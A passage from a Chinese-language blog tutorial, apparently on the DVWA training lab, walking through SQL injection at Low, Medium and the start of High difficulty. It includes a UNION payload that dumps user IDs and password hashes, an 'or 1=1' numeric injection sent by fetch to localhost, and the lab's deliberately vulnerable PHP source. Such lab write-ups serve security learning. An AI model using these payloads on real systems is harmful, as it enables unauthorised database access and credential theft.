&lt;p>注意到字段名 &lt;code>password&lt;/code>，接下来再 &lt;code>union&lt;/code> 查询一下 &lt;code>user_id&lt;/code> 和 &lt;code>password&lt;/code> 。&lt;/p>
&lt;p>&lt;code>union&lt;/code> 注入的时候有几个我觉得可能要注意的问题：&lt;/p>
&lt;ol>
&lt;li>被注入的 SQL 查询了几个列（&lt;code>union&lt;/code>的查询必须有相同数量的列），或者说有几个列的可以被观测到（查出来而且前端有变化）？这里我盲猜是两个或者三个列，所以 payload 里只写了两个列。&lt;/li>
&lt;li>查询出来之后有没有别的处理？如果还有别的判断，比如是静态类型的语言，&lt;code>union&lt;/code>查询的列类型不匹配；或者有别的业务逻辑没通过，都可能失败。&lt;/li>
&lt;/ol>
&lt;p>注入payload：&lt;code>' UNION SELECT user_id,password FROM users; --&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143644718.png"
width="395"
height="332"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143644718_hua49cdb081ad8f1de4e88b5ebeefa5809_9308_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143644718_hua49cdb081ad8f1de4e88b5ebeefa5809_9308_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427143644718"
class="gallery-image"
data-flex-grow="118"
data-flex-basis="285px"
>&lt;/p>
&lt;p>成功取得密码，但密码被哈希了，盲猜 md5，直接上 cmd5 解密。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143819668.png"
width="721"
height="244"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143819668_huda5786e8946bed5b5883742c81b2163b_8988_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143819668_huda5786e8946bed5b5883742c81b2163b_8988_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427143819668"
class="gallery-image"
data-flex-grow="295"
data-flex-basis="709px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143838942.png"
width="707"
height="259"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143838942_huf0baa613eae9510762ca67d57c112505_8804_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143838942_huf0baa613eae9510762ca67d57c112505_8804_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427143838942"
class="gallery-image"
data-flex-grow="272"
data-flex-basis="655px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143852594.png"
width="680"
height="238"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143852594_huf849a7d99be69135895294c4d6e3d294_8498_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143852594_huf849a7d99be69135895294c4d6e3d294_8498_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427143852594"
class="gallery-image"
data-flex-grow="285"
data-flex-basis="685px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143905939.png"
width="696"
height="246"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143905939_hu046a75d3e4e0e43329a69d0d4df0e4e3_8408_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143905939_hu046a75d3e4e0e43329a69d0d4df0e4e3_8408_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427143905939"
class="gallery-image"
data-flex-grow="282"
data-flex-basis="679px"
>&lt;/p>
&lt;p>5和1的哈希是一样的。到这里解密就全部完成了。&lt;/p>
&lt;h3 id="medium-难度">Medium 难度&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427144716349.png"
width="392"
height="175"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427144716349_hub0f8913afa5cca6b3e2fc8a6de0cc0fa_7931_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427144716349_hub0f8913afa5cca6b3e2fc8a6de0cc0fa_7931_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427144716349"
class="gallery-image"
data-flex-grow="224"
data-flex-basis="537px"
>&lt;/p>
&lt;p>注意到几点：&lt;/p>
&lt;ol>
&lt;li>前端输入变成了下拉选择。&lt;/li>
&lt;li>变成了 post 方式请求。&lt;/li>
&lt;/ol>
&lt;p>接着看下代码。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Submit&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;id&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_real_escape_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$id&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$_DVWA&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;SQLI_DB&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nx">MYSQL&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="nv">$query&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;SELECT first_name, last_name FROM users WHERE user_id = &lt;/span>&lt;span class="si">$id&lt;/span>&lt;span class="s2">;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$query&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">or&lt;/span> &lt;span class="k">die&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nx">mysqli_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Get results
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">while&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$row&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_fetch_assoc&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$result&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Display values
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$first&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$row&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;first_name&amp;#34;&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="nv">$last&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$row&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;last_name&amp;#34;&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="c1">// Feedback for end user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;ID: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$id&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;br /&amp;gt;First name: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$first&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;br /&amp;gt;Surname: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$last&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nx">SQLITE&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="c1">// 略 ...
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// This is used later on in the index.php page
&lt;/span>&lt;span class="c1">// Setting it here so we can close the database connection in here like in the rest of the source scripts
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nv">$query&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;SELECT COUNT(*) FROM users;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$query&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="k">or&lt;/span> &lt;span class="k">die&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_connect_error&lt;/span>&lt;span class="p">())&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$number_of_rows&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_fetch_row&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$result&lt;/span> &lt;span class="p">)[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="nx">mysqli_close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>注意到两个改变：&lt;/p>
&lt;ol>
&lt;li>&lt;code>mysqli_real_escape_string($GLOBALS[&amp;quot;___mysqli_ston&amp;quot;], $id);&lt;/code>，对&lt;code>$id&lt;/code>做了转义。&lt;/li>
&lt;li>&lt;code>&amp;quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&amp;quot;&lt;/code>，变成了数字型注入。&lt;/li>
&lt;/ol>
&lt;p>按理说做了转义应该就没辙了，但还是先试试。F12从开发者工具里复制出请求，然后把&lt;code>id&lt;/code>改成&lt;code>0 or 1=1; --&lt;/code>，注意百分号编码而且&lt;code>--&lt;/code>后面留一个空格。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kr">await&lt;/span> &lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/sqli/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;headers&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;accept&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;accept-language&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;cache-control&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;no-cache&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;content-type&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;application/x-www-form-urlencoded&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;pragma&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;no-cache&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-ch-ua&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;\&amp;#34; Not A;Brand\&amp;#34;;v=\&amp;#34;99\&amp;#34;, \&amp;#34;Chromium\&amp;#34;;v=\&amp;#34;100\&amp;#34;, \&amp;#34;Microsoft Edge\&amp;#34;;v=\&amp;#34;100\&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-ch-ua-mobile&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;?0&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-ch-ua-platform&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;\&amp;#34;Windows\&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-fetch-dest&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;document&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-fetch-mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;navigate&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-fetch-site&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;same-origin&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-fetch-user&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;?1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;upgrade-insecure-requests&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;1&amp;#34;&lt;/span>
&lt;span class="p">},&lt;/span>
&lt;span class="s2">&amp;#34;referrer&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/sqli/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;referrerPolicy&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;strict-origin-when-cross-origin&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;body&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;id=0%20or%201%3D1%3B%20--%20&amp;amp;Submit=Submit&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;method&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;POST&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;cors&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;credentials&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;include&amp;#34;&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427145427860.png"
width="228"
height="275"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427145427860_hu5650447de8c114658782d5fa9d9f9a1a_4509_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427145427860_hu5650447de8c114658782d5fa9d9f9a1a_4509_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427145427860"
class="gallery-image"
data-flex-grow="82"
data-flex-basis="198px"
>&lt;/p>
&lt;p>好吧，这就直接成功了。到了这一步其实剩下的和 Low 难度就没区别了。&lt;/p>
&lt;p>不过我对那个 &lt;code>mysqli_real_escape_string&lt;/code> 还是很好奇，这个函数不是拿来防 SQL 注入的？查询文档如下。&lt;/p>
&lt;blockquote>
&lt;p>mysqli::real_escape_string &amp;ndash; mysqli_real_escape_string — Escapes special characters in a string for use in an SQL statement, taking into account the current charset of the connection&lt;/p>
&lt;/blockquote>
&lt;p>看用例，这个&lt;code>real_escape_string&lt;/code>会把参数转义成合法的 SQL 字符串，也就是应该会转义处理特殊字符比如&lt;code>'&lt;/code>，但返回结果是没有&lt;code>'&lt;/code>的，所以即使用&lt;code>real_escape_string&lt;/code>转义后，这个参数最多是可以被安全放到&lt;code>''&lt;/code>里，但如果不是在&lt;code>''&lt;/code>里的话安全隐患就一点不少。&lt;/p>
&lt;h3 id="high-难度">High 难度&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427150448746.png"
width="493"
height="355"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427150448746_huc2b4caa9a99e052ed67febd9955e96a7_19459_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427150448746_huc2b4caa9a99e052ed67febd9955e96a7_19459_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427150448746"
class="gallery-image"
data-flex-grow="138"
data-flex-basis="333px"
>&lt;/p>
&lt;p>High难度就比较怪了，从这个窗口输入1提交之后，页面直接刷新出了id对应的用户信息，这个交互是真没见过。接着审阅下源码。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_SESSION&lt;/span> &lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;id&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;id&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$_DVWA&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;SQLI_DB&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nx">MYSQL&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="c1">// Check database
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$query&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;SELECT first_name, last_name FROM users WHERE user_id = &amp;#39;&lt;/span>&lt;span class="si">$id&lt;/span>&lt;span class="s2">&amp;#39; LIMIT 1;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$query&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="k">or&lt;/span> &lt;span class="k">die&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;Something went wrong.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Get results
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">while&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$row&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_fetch_assoc&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$result&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get values
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$first&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$row&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;first_name&amp;#34;&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="nv">$last&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$row&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;last_name&amp;#34;&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="c1">// Feedback for end user
